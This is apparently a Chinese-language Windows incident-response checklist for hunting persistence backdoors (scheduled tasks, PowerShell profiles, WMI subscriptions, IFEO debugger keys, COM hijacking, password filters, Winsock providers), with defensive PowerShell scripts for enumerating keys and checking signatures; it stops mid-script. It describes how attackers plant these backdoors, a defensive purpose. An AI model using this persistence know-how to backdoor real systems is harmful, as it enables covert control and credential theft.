https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C%E8%AE%B0%E5%BD%95%E7%9A%84%E8%8E%B7%E5%8F%96%E4%B8%8E%E6%B8%85%E9%99%A4

https://ericzimmerman.github.io/#!index.md

### 0x02 证书排查

这一部分主要是查看一下是否存在恶意程序安装的证书，因为这可能影响后续的签名校验等排查

### 0x03 账号信息

### 0x04 登录信息

### 0x05 启动项

启动项排查主要有以下方法和内容，包含了常规的检查办法，还有基本的启动项目录，都需要检查一遍，同时注册表是作为启动项检查方式之一，存在固定的注册表位置和语句，以下也有列举。

### 0x06 计划任务

定时任务经常是病毒、后门、权限维持等恶意行为的常见操作对象，通过添加新的定时任务，启动恶意脚本、Powershell或者其他命令行语句来达到权限维持或者扩散的目的

排查计划任务开始前，需要先开启计划任务记录，以防相关任务未记录导致无法排查

此处计划任务建议主要以 注册表 排查为主，清晰明了，同时展示内容也相对省去了很多不必要的内容。

### 0x07 网络连接

### 0x08 IPC 共享

`net share

```
 【 Windows Server 2016 】默认情况

### 0x09 进程

### 0x10 环境变量

可以重点关注 `path` 和 `pathext`

### 0x11 系统基本信息及补丁

### 0x12 系统日志分析

无论大家使用哪款程序来帮助分析日志，我都建议大家先把日志备份一份儿，同时在同款主机上测试一下工具的可用性

### 0x13 命令历史

### 0x14 PowerShell 配置文件

`cmd` 没有类似于 `bash` 的配置文件，但是 `Powershell` 是有的

https://learn.microsoft.com/zh-cn/Powershell/module/microsoft.Powershell.core/about/about_profiles?view=Powershell-7.4

`Powershell` 配置文件的位置可以通过 `Powershell` 变量 `$PROFILE` 的值来确定

`Powershell` 中执行

 `$PROFILE | Select-Object *

```

 `AllUsersAllHosts       : C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1
AllUsersCurrentHost    : C:\Windows\System32\WindowsPowerShell\v1.0\Microsoft.PowerShell_profile.ps1
CurrentUserAllHosts    : C:\Users\Administrator\Documents\WindowsPowerShell\profile.ps1
CurrentUserCurrentHost : C:\Users\Administrator\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1

```
 这些配置文件中都可以类似 `Bash` 配置文件一样，在其中放置后门程序

排查时记得查看不同用户的文件夹

具体情况可以查看 知识点附录 -> 0x11 PowerShell 配置文件实验

【 Windows Server 2016 】默认情况

 `AllUsersAllHosts       : C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1
AllUsersCurrentHost    : C:\Windows\System32\WindowsPowerShell\v1.0\Microsoft.PowerShell_profile.ps1
CurrentUserAllHosts    : C:\Users\Administrator\Documents\WindowsPowerShell\profile.ps1
CurrentUserCurrentHost : C:\Users\Administrator\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1

```

默认情况下都不存在这些文件

### 0x15 PowerShell 日志

`Win + r` 输入 `eventvwr`

应用程序和服务日志 -> `Windows Powershell`

### 0x16 PowerShell Alias

直接在 `Powershell` 命令行输入

 `alias

```

【 Windows Server 2016 】默认情况

 `CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Alias           % -> ForEach-Object
Alias           ? -> Where-Object
Alias           ac -> Add-Content
Alias           asnp -> Add-PSSnapin
Alias           cat -> Get-Content
Alias           cd -> Set-Location
Alias           CFS -> ConvertFrom-String                          3.1.0.0    Microsoft.PowerShell.Utility
Alias           chdir -> Set-Location
Alias           clc -> Clear-Content
Alias           clear -> Clear-Host
Alias           clhy -> Clear-History
Alias           cli -> Clear-Item
Alias           clp -> Clear-ItemProperty
Alias           cls -> Clear-Host
Alias           clv -> Clear-Variable
Alias           cnsn -> Connect-PSSession
Alias           compare -> Compare-Object
Alias           copy -> Copy-Item
Alias           cp -> Copy-Item
Alias           cpi -> Copy-Item
Alias           cpp -> Copy-ItemProperty
Alias           curl -> Invoke-WebRequest
Alias           cvpa -> Convert-Path
Alias           dbp -> Disable-PSBreakpoint
Alias           del -> Remove-Item
Alias           diff -> Compare-Object
Alias           dir -> Get-ChildItem
Alias           dnsn -> Disconnect-PSSession
Alias           ebp -> Enable-PSBreakpoint
Alias           echo -> Write-Output
Alias           epal -> Export-Alias
Alias           epcsv -> Export-Csv
Alias           epsn -> Export-PSSession
Alias           erase -> Remove-Item
Alias           etsn -> Enter-PSSession
Alias           exsn -> Exit-PSSession
Alias           fc -> Format-Custom
Alias           fhx -> Format-Hex                                  3.1.0.0    Microsoft.PowerShell.Utility
Alias           fl -> Format-List
Alias           foreach -> ForEach-Object
Alias           ft -> Format-Table
Alias           fw -> Format-Wide
Alias           gal -> Get-Alias
Alias           gbp -> Get-PSBreakpoint
Alias           gc -> Get-Content
Alias           gci -> Get-ChildItem
Alias           gcm -> Get-Command
Alias           gcs -> Get-PSCallStack
Alias           gdr -> Get-PSDrive
Alias           ghy -> Get-History
Alias           gi -> Get-Item
Alias           gjb -> Get-Job
Alias           gl -> Get-Location
Alias           gm -> Get-Member
Alias           gmo -> Get-Module
Alias           gp -> Get-ItemProperty
Alias           gps -> Get-Process
Alias           gpv -> Get-ItemPropertyValue
Alias           group -> Group-Object
Alias           gsn -> Get-PSSession
Alias           gsnp -> Get-PSSnapin
Alias           gsv -> Get-Service
Alias           gu -> Get-Unique
Alias           gv -> Get-Variable
Alias           gwmi -> Get-WmiObject
Alias           h -> Get-History
Alias           history -> Get-History
Alias           icm -> Invoke-Command
Alias           iex -> Invoke-Expression
Alias           ihy -> Invoke-History
Alias           ii -> Invoke-Item
Alias           ipal -> Import-Alias
Alias           ipcsv -> Import-Csv
Alias           ipmo -> Import-Module
Alias           ipsn -> Import-PSSession
Alias           irm -> Invoke-RestMethod
Alias           ise -> Powershell_ise.exe
Alias           iwmi -> Invoke-WMIMethod
Alias           iwr -> Invoke-WebRequest
Alias           kill -> Stop-Process
Alias           lp -> Out-Printer
Alias           ls -> Get-ChildItem
Alias           man -> help
Alias           md -> mkdir
Alias           measure -> Measure-Object
Alias           mi -> Move-Item
Alias           mount -> New-PSDrive
Alias           move -> Move-Item
Alias           mp -> Move-ItemProperty
Alias           mv -> Move-Item
Alias           nal -> New-Alias
Alias           ndr -> New-PSDrive
Alias           ni -> New-Item
Alias           nmo -> New-Module
Alias           npssc -> New-PSSessionConfigurationFile
Alias           nsn -> New-PSSession
Alias           nv -> New-Variable
Alias           ogv -> Out-GridView
Alias           oh -> Out-Host
Alias           popd -> Pop-Location
Alias           ps -> Get-Process
Alias           pushd -> Push-Location
Alias           pwd -> Get-Location
Alias           r -> Invoke-History
Alias           rbp -> Remove-PSBreakpoint
Alias           rcjb -> Receive-Job
Alias           rcsn -> Receive-PSSession
Alias           rd -> Remove-Item
Alias           rdr -> Remove-PSDrive
Alias           ren -> Rename-Item
Alias           ri -> Remove-Item
Alias           rjb -> Remove-Job
Alias           rm -> Remove-Item
Alias           rmdir -> Remove-Item
Alias           rmo -> Remove-Module
Alias           rni -> Rename-Item
Alias           rnp -> Rename-ItemProperty
Alias           rp -> Remove-ItemProperty
Alias           rsn -> Remove-PSSession
Alias           rsnp -> Remove-PSSnapin
Alias           rujb -> Resume-Job
Alias           rv -> Remove-Variable
Alias           rvpa -> Resolve-Path
Alias           rwmi -> Remove-WMIObject
Alias           sajb -> Start-Job
Alias           sal -> Set-Alias
Alias           saps -> Start-Process
Alias           sasv -> Start-Service
Alias           sbp -> Set-PSBreakpoint
Alias           sc -> Set-Content
Alias           select -> Select-Object
Alias           set -> Set-Variable
Alias           shcm -> Show-Command
Alias           si -> Set-Item
Alias           sl -> Set-Location
Alias           sleep -> Start-Sleep
Alias           sls -> Select-String
Alias           sort -> Sort-Object
Alias           sp -> Set-ItemProperty
Alias           spjb -> Stop-Job
Alias           spps -> Stop-Process
Alias           spsv -> Stop-Service
Alias           start -> Start-Process
Alias           sujb -> Suspend-Job
Alias           sv -> Set-Variable
Alias           swmi -> Set-WMIInstance
Alias           tee -> Tee-Object
Alias           trcm -> Trace-Command
Alias           type -> Get-Content
Alias           wget -> Invoke-WebRequest
Alias           where -> Where-Object
Alias           wjb -> Wait-Job
Alias           write -> Write-Output

```

### 0x17 服务程序

Windows服务是在Microsoft Windows操作系统中运行的后台应用程序。服务是一种特殊类型的进程，它们被设计为在操作系统启动时自动启动，并在操作系统运行期间持续运行，即使用户没有登录到系统也是如此。这使得它们能够在系统背后执行各种任务，如网络通信、文件共享、打印管理、安全性等。

### 0x18 远程桌面 RDP

### 0x19 DLL 检查

在安全模式下 DLL 搜索顺序如下

 - DLL 重定向
 - `API sets`
 - `SxS manifest redirection`
 - `Loaded-module list`
 - `Known DLLs`
 - 流程的包依赖关系图 （Windows 11，版本 21H2 (10.0;内部版本 22000) 及更高版本）
 - 应用程序的文件夹
 - 系统文件夹  (`C:\Windows\System32`)  使用 `GetSystemDirectoryA` 函数检索此文件夹的路径
 - 16 位系统文件夹 (`C:\Windows\System`)  没有获取此文件夹路径的函数，但会对其进行搜索
 - Windows 文件夹 (`C:\Windows`) 使用 `GetWindowsDirectoryA` 函数获取此文件夹的路径
 - 当前文件夹
 - 环境变量中列出的 `PATH` 目录

 这里要说两个

 - `Loaded-module list`  系统可以检查是否已将具有相同模块名称的 DLL 加载到内存加载的
 - `Known DLLs`  如果 DLL 位于运行应用程序的 Windows 版本的已知 DLL 列表中，则系统会使用其已知 DLL

 参考文章

https://learn.microsoft.com/zh-cn/windows/win32/dlls/dynamic-link-library-search-order

DLL 排查其实分散在常规安全检查的各种部分

### 0x20 WMI 排查

WMI 主要是创建 WMI 事件订阅实现持续控制，通常事件订阅是临时性的，会话结束后就会停止，WMI永久事件订阅，可以创建长期有效的订阅，即使订阅会话已经结束，订阅仍然持续存在。

WMI 事件订阅中有三个角色

 - 事件过滤器（Event Filter）：事件过滤器定义了订阅的事件条件。它指定了需要监听的WMI对象或类以及要监控的属性或方法的条件。事件过滤器使用WMI查询语言（WQL）来描述事件的筛选条件。
 - 事件消费者（Event Consumer）：事件消费者定义了在事件发生时要执行的操作。它可以是一个命令行、脚本或可执行文件，也可以是自定义的WMI操作。事件消费者根据事件的特定属性执行相应的操作。
 - 绑定（Binding）：绑定将事件过滤器和事件消费者连接起来，以建立订阅关系。绑定将事件过滤器与事件消费者相关联，使得在事件满足过滤器条件时，相应的事件消费者将被触发执行。

 这听起来很像是 `if...then` 或者说信号与槽

攻击者通过事件过滤器定义要监听的操作，之后再定义监听到操作后要执行的动作，最后将两者绑定起来

排查思路就是找出当前系统所有命名空间的过滤器、消费者、绑定

经过测试发现，`\root\subscription` 和 `\root\DEFAULT` 两个命名空间均可以实现事件订阅后门，这在很多文章中并未提及，大家需要额外注意

部分文章指出 `Autoruns` 删除 WMI 后门效果不好，这不严谨，详情可以看后续部分

### 0x21 最近打开的文件

是windows下用户打开的文档历史文件记录

`win + r` 输入 `Recent`

这一般用户确定某个用户已经失陷，之后切到该用户后排查的项

### 0x22 敏感文件夹检查

- 临时目录
 - 垃圾桶目录
 - 被删除用户的家目录
 - public 目录
 - web目录

### 0x23 系统完整性检查

`sigverif

```
 sigverif 是一个用于验证 Windows 系统文件签名的命令行工具。它可以检查系统文件是否被篡改或损坏，以确保系统的完整性和安全性。

sigverif 命令可以检查所有系统文件，包括驱动程序、系统组件、应用程序等。它通过比较系统文件的哈希值与已知的正确哈希值来验证文件的完整性。如果文件的哈希值与已知的正确哈希值匹配，则文件未被篡改；如果不匹配，则文件可能已被篡改或损坏。

如果想看详细的内容，可以点击高级，去日志中查看

### 0x24 Bits Job 检查

`bitsadmin /list /allusers /verbose

```
 列出所有任务

`Windows Server 2016` 中提示 `bitsadmin` 已经被弃用了，现在都通过 `Powershell` 来管理 `bits` 服务

 `Get-BitsTransfer

```

如果发现存在攻击者留下的 `Job` ，可以使用下面的命令删除

 `Remove-BitsTransfer -BitsJob <BitsJob>

```

### 0x25 浏览器排查

浏览器排查主要有三个方面

 - 下载记录
 - 访问记录
 - 浏览器扩展

 这里还是以自带的 `ie` 浏览器为例，`Chrome、Edge、Firefox` 大家肯定都会检查

### 0x26 屏幕保护排查

HKEY_CURRENT_USER\Control Panel\Desktop

 - `SCRNSAVE.exe`  设置为恶意 PE 路径
 - `ScreenSaveActive`- 设置为“1”以启用屏幕保护程序
 - `ScreenSaverIsSecure`- 设置为“0”无需密码即可解锁
 - `ScreenSaveTimeout`- 在执行屏幕保护程序之前设置用户不活动超时

 在 Windows Server 2016 中，默认没有 `SCRNSAVE.exe`，如果检查过程中发现该项，可以重点关注

【 Windows Server 2016 】默认情况

### 0x27 NetSh 排查

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh

【 Windows Server 2016 】 默认情况

 `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh
    2    REG_SZ    ifmon.dll
    4    REG_SZ    rasmontr.dll
    authfwcfg    REG_SZ    authfwcfg.dll
    dhcpclient    REG_SZ    dhcpcmonitor.dll
    dot3cfg    REG_SZ    dot3cfg.dll
    fwcfg    REG_SZ    fwcfg.dll
    hnetmon    REG_SZ    hnetmon.dll
    netiohlp    REG_SZ    netiohlp.dll
    nettrace    REG_SZ    nettrace.dll
    nshhttp    REG_SZ    nshhttp.dll
    nshipsec    REG_SZ    nshipsec.dll
    nshwfp    REG_SZ    nshwfp.dll
    peerdistsh    REG_SZ    peerdistsh.dll
    rpc    REG_SZ    rpcnsh.dll
    whhelper    REG_SZ    whhelper.dll
    wshelper    REG_SZ    wshelper.dll

```

### 0x28 辅助功能程序

比较经典的是替换粘滞键，未登录情况下通过连按 5 下 shift 进行获取shell

 功能名称 文件位置 粘滞键 `C:\Windows\System32\sethc.exe` 实用程序管理器 `C:\Windows\System32\utilman.exe` 屏幕键盘 `C:\Windows\System32\osk.exe` 放大镜 `C:\Windows\System32\Magnify.exe` 讲述人 `C:\Windows\System32\Narrator.exe` 显示切换器 `C:\Windows\System32\DisplaySwitch.exe` 应用程序切换器 `C:\Windows\System32\AtBroker.exe` 可以通过沙箱或者签名进行验证，这里需要注意： cmd.exe 这种程序也是有微软签名的，不能仅用签名进行验证

签名验证可以参考知识点附录 -> 如何验证程序签名

### 0x29 AppCert DLLs

AppCert DLLs是一个Windows注册表项，通常用于控制应用程序的证书验证。当有进程使用了CreateProcess、CreateProcessAsUser、CreateProcessWithLoginW、CreateProcessWithTokenW或WinExec等函数时，这些进程会获取HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SessionManager\AppCertDlls注册表项，此项下的dll都会加载到此进程。

 `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\AppCertDlls

```
 存在后门时可能是这个样子

图片来源

https://blog.csdn.net/qq_36374896/article/details/107005578

【 Windows Server 2016 】默认情况

Windows Server 2016 中默认没有这个注册表项

### 0x30 AppInit DLL

AppInit DLL（Application Initialization DLL）是一种在Windows操作系统中使用的动态链接库（DLL）。它的作用是在应用程序加载时，可以用于执行自定义的初始化和配置操作。

下面是AppInit DLL的一些常见用途和功能：

 - 应用程序初始化：AppInit DLL可以用于执行应用程序的初始化操作。例如，它可以加载应用程序所需的其他依赖项、设置环境变量、初始化全局变量等。
 - 钩子和拦截：AppInit DLL可以用于创建钩子（hook）和拦截应用程序的函数调用。通过拦截应用程序的API调用，AppInit DLL可以修改或监视应用程序的行为。这可以用于实现各种功能，如检测和阻止恶意行为、记录日志、修改应用程序的行为等。
 - 兼容性修正：AppInit DLL可以用于修复应用程序的兼容性问题。它可以拦截应用程序的调用，并在运行时对这些调用进行修改，以使应用程序能够在特定的操作系统版本或环境中正常工作。

 因此，AppInit DLL 用来设置后门非常合适，注册表位置如下

 `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows
HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows

```

也可以通过 `Autoruns` 进行查看

【 Windows Server 2016 】默认情况

默认情况下存在该键，两个位置都是空的

### 0x31 Application Shimming

这是一种在Windows操作系统中使用的兼容性技术，旨在解决应用程序在不同操作系统版本上的兼容性问题。Application Shimming 的原理是在应用程序执行时，通过注入特定的代码或修改应用程序的行为，来实现兼容性修复或功能增强。这些修改通常是通过Shim引擎来实现的，Shim引擎会拦截和修改应用程序的API调用。

攻击者可能会利用Application Shimming 来创建后门的原因包括：

 - 拦截和修改应用程序的行为：Shim引擎可以拦截应用程序的API调用，并修改它们的行为。攻击者可以利用这一特性，将恶意代码注入到应用程序中，以实现远程控制、数据窃取、命令执行等恶意操作。
 - 绕过安全措施：Application Shimming 可以绕过一些安全措施，如防火墙、杀毒软件等。攻击者可以利用这一特性，使恶意行为在被安全软件检测之前或之后执行，从而避免被检测和阻止。
 - 持久性访问：由于Application Shimming 通常是通过注册表设置或文件劫持来实现的，攻击者可以利用这些机制来维持持久性访问。他们可以修改注册表项或替换系统文件，以确保每次应用程序启动时都会加载恶意的Shim代码。

 默认 Windows 安装程序 （`sdbinst.exe`） 当前安装的所有填充码的列表保存在：

 - `%WINDIR%\AppPatch\sysmain.sdb`
 - `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags`

自定义数据库存储在：

 - `%WINDIR%\AppPatch\custom & %WINDIR%\AppPatch\AppPatch64\Custom`
 - `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom`

缓存位置

 `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache

```

这里都是二进制数据，虽然能看到字符，建议只用来做参考

【 Windows Server 2016 】默认情况

默认

自定义

### 0x32 IFEO Injection 排查

`Image File Execution Options (IFEO)` 是一个 Windows 调试功能，而不是一个后门。IFEO 的主要目的是允许开发人员调试和跟踪特定的可执行文件。

IFEO 提供了一种机制，使开发人员能够将一个调试器程序关联到特定的可执行文件，并在执行该可执行文件时启动调试器。这对于开发、调试和分析应用程序非常有用。

当给定的可执行文件被启动时，操作系统会检查注册表中的 IFEO 设置。如果找到了对应的注册表项，系统会自动启动所配置的调试器程序，并将目标可执行文件作为参数传递给调试器。这样，开发人员就可以使用调试器来监视和分析目标应用程序的运行过程，以便调试和解决问题。

 `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options

```

红框中就是可以被调试的程序，如果在这些项某个项，例如`iexplore.exe` 中新增一对键值，键的名字为 `debugger` ，值为要执行的程序，例如 `calc.exe`，就会在启动 `iexplorer.exe` 的时候启动计算器

这里需要注意，设置后点击ie浏览器并不会启动ie ，而是只启动调试器，也就是这里的计算器

当然了，聪明的攻击者肯定会在 `Payload` 中启动原程序，以达到隐藏的目录

这么老多目录，还是通过 `Powershell` 来完成吧

 `$registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
$subKeys = Get-ChildItem -Path $registryPath
$debuggerItems = @()

foreach ($subKey in $subKeys) {
    $keyName = $subKey.PSChildName
    $keyValues = Get-ItemProperty -Path "$registryPath\$keyName"

    foreach ($entry in $keyValues.PSObject.Properties) {
        $entryName = $entry.Name
        $entryValue = $entry.Value

        if ($entryName -eq 'debugger') {
            $debuggerItems += @{
                Subkey = $keyName
                Key = $entryName
                Value = $entryValue
            }
        }
    }
}

if ($debuggerItems.Count -gt 0) {
    Write-Host "Debuggers found:"
    Write-Host "----------------"

    foreach ($item in $debuggerItems) {
        Write-Host "Subkey: $($item.Subkey)"
        Write-Host "Key   : $($item.Key)"
        Write-Host "Value : $($item.Value)"
        Write-Host "----------------"
    }
}
else {
    Write-Host "No debuggers found."
}

```

【 Windows Server 2016 】默认情况

### 0x33 COM 劫持

COM（Component Object Model）是一种微软公司开发的软件组件技术，用于在Windows操作系统中实现软件组件之间的通信和交互。COM 提供了一种标准的、可扩展的机制，使不同的应用程序能够通过接口进行相互通信和调用。

COM 的主要功能包括：

 - 组件化：COM 将软件功能划分为独立的组件，每个组件可以独立开发、测试和部署。这样的组件化方式使得软件开发更加模块化、可维护性更强。
 - 接口定义：COM 使用接口（Interface）来定义组件之间的通信规范。每个组件提供一个或多个接口，其他组件可以通过接口访问组件的功能。
 - 组件注册：COM 组件需要在操作系统中进行注册，以便其他应用程序能够找到和使用这些组件。注册表中存储了组件的相关信息，包括组件的唯一标识符（CLSID）和接口标识符（IID）等。
 - 运行时环境：COM 提供了一个运行时环境，负责加载和实例化组件，并管理组件之间的通信。运行时环境处理了组件的生命周期、对象的创建和销毁、接口的查询和调用等。

 COM 劫持与 DLL 劫持原理差不多，都是在文件寻找过程上下文章，默认情况下也是不太好检查，可以想象一下，无非就是一下几种情况

 - 在加载顺序更靠前的地方放置同名文件
 - 直接替换要被读取的文件
 - 向要被读取的文件中注入自定义恶意代码

 通常是通过注册表找到具体要读取的文件，查找注册表顺序如下

 - `HKEY_CURRENT_USER\Software\Classes\CLSID`
 - `HKEY_CLASSES_ROOT\CLSID`
 - `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellCompatibility\Objects\`

 参考文章

https://paper.seebug.org/2030/

我们以计算器为例，通过 `Process Monitor` 查看进程加载文件和注册表等信息

这里可以看到，加载 `COM` 组件时先是去查找了下面的注册表位置，结果没找到

 `HKCU\Software\Classes\CLSID\{7ED96837-96F0-4812-B211-F13C24117ED3}\Instance

```
 之后又去下面的位置进行寻找

 `HKCR\CLSID\{7ED96837-96F0-4812-B211-F13C24117ED3}\Instance

```
 结果找到了

如果攻击者在 `HKCU\Software\Classes\CLSID\{7ED96837-96F0-4812-B211-F13C24117ED3}\Instance` 放置一个同名的组件，实现了原本的功能，还加入了恶意代码，此时就会造成 `COM` 劫持

### 0x34 Password Filter

密码过滤器是一种安全功能，用于在用户更改密码时对密码进行验证和强制规则。它允许系统管理员定义一组自定义规则和策略，以确保用户设置的密码符合安全要求。

密码过滤器的主要目的是增强密码的复杂性和强度，从而提高系统的安全性。它可以执行以下任务：

 - 强制密码策略：密码过滤器可以强制实施密码策略，例如密码长度、复杂性、过期时间等要求。这有助于确保用户选择的密码具有足够的复杂性，不容易被猜测或破解。
 - 检查常见密码：密码过滤器可以检查用户设置的密码是否属于常见密码列表中。这有助于防止使用容易猜测的密码，如`123456`、`password`等。
 - 自定义验证规则：管理员可以定义自定义验证规则，以满足特定的安全需求。例如，要求密码包含特定字符、不允许使用特定单词或模式等。
 - 通知和警告：密码过滤器可以向用户提供有关密码复杂性要求的通知和警告，以帮助他们创建符合要求的密码。

 通过密码过滤器，管理员可以确保用户设置的密码符合组织的安全策略，并提高整个系统的安全性。它是一项重要的安全措施，用于防止弱密码和密码猜测攻击，从而降低系统遭受密码相关威胁的风险。

攻击者常常利用这个功能窃取用户的明文密码，当然主要是新用户

 `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\ 的 Notification Packages 键对应的值

```

这些都是 `DLL` 只不过这里不写 `.dll`

【 Windows Server 2016 】默认情况

### 0x35 Network Provider

`Network Provider` 类型的后门主要是窃取网络登录的明文密码，其实我觉得只要明文密码需要被处理，那么这个处理流程中的这些程序都会被发掘用来做后门

 `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\NetworkProvider\HwOrder

```

 - `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order`

用于配置普通的网络提供程序 DLL 的顺序

 - `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\NetworkProvider\HwOrder`

用于配置硬件网络提供程序的顺序。这些注册表路径允许用户和管理员管理和控制网络提供程序的加载顺序，以满足特定的网络连接需求和优先级

 `prl_fs,LanmanWorkstation,RDPNP

```
 这些都是服务名称，在这些服务注册表中都存在 `NetworkProvider` 子项

也可以通过 `Autoruns` 进行查看，但更推荐通过注册表查看

【 Windows Server 2016 】默认情况

 `prl_fs,LanmanWorkstation,RDPNP

```
 这里的 `prl_fs` 是我的`PD` 虚拟机的 `tools` 添加的，所以默认应该不存在

 `%SystemRoot%\System32\ntlanman.dll

```

 `%SystemRoot%\System32\drprov.dll

```

### 0x36 Winsock NSP

WinSock NSP（WinSock Namespace Provider）是指在 Windows 操作系统中实现网络套接字编程接口（Socket API）的组件之一。它负责提供网络通信的底层功能，使应用程序能够通过网络进行数据传输。

WinSock NSP 通过一组动态链接库（DLL）来实现，这些 DLL 包含了实现网络协议栈和通信协议的代码。它们提供了一种标准化的编程接口，使开发人员能够使用常见的网络协议（如TCP/IP、UDP）进行网络通信。

通过 WinSock NSP，开发人员可以创建套接字、建立连接、发送和接收数据等网络操作。它提供了一系列函数和数据结构，使应用程序能够方便地进行网络编程，实现网络通信功能

WinSock NSP 后门的原理如下：

 - 劫持或替换 Namespace Provider DLL：攻击者通过劫持或替换系统中的 Namespace Provider DLL 文件来实现后门功能。Namespace Provider DLL 是实现命名空间提供者功能的动态链接库，用于处理网络命名空间的解析和操作。
 - 注册恶意 Namespace Provider：攻击者可以注册一个恶意的 Namespace Provider，将其注入到系统的 Namespace Provider 链表中。这样，当应用程序进行网络命名空间解析时，恶意的 Namespace Provider 将被调用，攻击者可以在其中进行拦截、篡改或记录网络流量。
 - 修改 Namespace Provider 设置：攻击者可以修改系统中的 Namespace Provider 设置，例如修改优先级顺序、修改默认的命名空间解析规则等。这样，攻击者可以将网络流量重定向到恶意的服务器或进行其他恶意操作。

 注册表位置

 `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\Protocol_Catalog9\Catalog_Entries\
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\Protocol_Catalog9\Catalog_Entries64
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries\
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\Protocol_Catalog9\Num_Catalog_Entries

```
 前面四个注册表位置每个子键代表一个已注册的 `WinSock Namespace Provider`。检查这些子键的值，特别是以下几个值：

 - `ProtocolChain`：这个值指定了命名空间提供者的优先级顺序。确保优先级顺序中没有未知或可疑的提供者。
 - `LibraryPath`：这个值指定了命名空间提供者 DLL 的路径。验证 DLL 的路径是否与已知的合法提供者相匹配。
 - `DisplayName`：这个值提供了命名空间提供者的显示名称。确保名称与已知的合法提供者一致。

 最后一个注册表主要是表示注册的 `WinSock Namespace Providers` 的数量。确保该值与实际注册的数量一致，以排除任何异常情况。

这里思路还是通过 `Powershell` 提取每个 `dll` ，之后进行签名验证

 `$microsoftCNS = @('Microsoft Corporation', 'Microsoft Windows', 'Microsoft Windows Hardware Compatibility Publisher', 'Microsoft Update', 'Microsoft Windows Publisher')

# 定义函数来进行签名校验
function Verify-FileSignature {
    param (
        [Parameter(Mandatory=$true)]
        [ValidateScript({Test-Path $_ -PathType Leaf})]
        [string]$FilePath
    )

    if (Test-Path -Path $FilePath -PathType Leaf) {
        $signature = Get-AuthenticodeSignature -FilePath $FilePath

        if ($signature.Status -eq 'Valid') {
            $publisher = $signature.SignerCertificate.Subject

            # 解析发布者信息以提取 CN 字段的值
            $cnValues = @(($publisher -split ', ' | Where-Object { $_ -like 'CN=*' }).Substring(3))

            if ($cnValues.Count -eq 1) {
                $cnValue = $cnValues[0]
                # Write-Output "CN 字段的值: $cnValue"

                # 判断 CN 字段是否为微软官方
                if ($microsoftCNS -contains $cnValue) {
                    # Write-Output "CN 字段值为微软官方。"
                    return "Valid"
                }
            }
        }

        return "Invalid"

    }

    return "File Not Found"

}

# 定义函数来检查注册表地址
function Check-RegistryPaths {
    param (
        [Parameter(Mandatory=$true)]
        [string[]]$RegistryPaths
    )

    $invalidSignatures = @()

    foreach ($registryPath in $RegistryPaths) {
        if (Test-Path -Path $registryPath) {
            $subkeys = Get-ChildItem -Path $registryPath
            foreach ($subkey in $subkeys) {
                # $ParametersPath = Join-Path -Path $subkey.PSPath -ChildPath "Parameters"
                $ParametersPath = $subkey.PSPath
                if (Test-Path -Path $ParametersPath) {
                    $libraryValue = (Get-ItemProperty -Path $ParametersPath -Name "LibraryPath" -ErrorAction SilentlyContinue)."LibraryPath"
                    if ($libraryValue) {
                        $binaryFilePath = $libraryValue.Trim().Trim('"')
                        $binaryFilePath = [Environment]::ExpandEnvironmentVariables($binaryFilePath)
                        if (Test-Path $binaryFilePath) {
                            $result = Verify-FileSignature -FilePath $binaryFilePath
                            if ($result -eq "Invalid") {
                                $invalidSignatures += @{
                                    RegistryPath = $subkey
                                    BinaryFilePath = $binaryFilePath
                                }
                                Write-Host "Signature is invalid for file: $binaryFilePath" -ForegroundColor Red
                            } elseif ($result -eq "Valid") {
                                Write-Host "Signature is valid for file: $binaryFilePath " -ForegroundColor Green
                            }
                        } else {
                            $dllFileName = Split-Path -Leaf $binaryFilePath
                            $found = $false
                            $searchPaths = @(
                                (Join-Path -Path $env:SystemRoot -ChildPath $dllFileName),
                                (Join-Path -Path $env:SystemRoot -ChildPath "System32\$dllFileName")
                            )
                            foreach ($path in $searchPaths) {
                                if (Test-Path $path) {
                                    $found = $true
                                    $result = Verify-FileSignature -FilePath $path
                                    if ($result -eq "Invalid") {
                                        $invalidSignatures += @{
                                            RegistryPath = $subkey
                                            BinaryFilePath = $path
                                        }
                                        Write-Host "Signature is invalid for file: $path" -ForegroundColor Red
                                    } elseif ($result -eq "Valid") {
                                        Write-Host "Signature is valid for file: $path " -ForegroundColor Green
                                    }
                                    break
                                }
                            }
                            if (-not $found) {
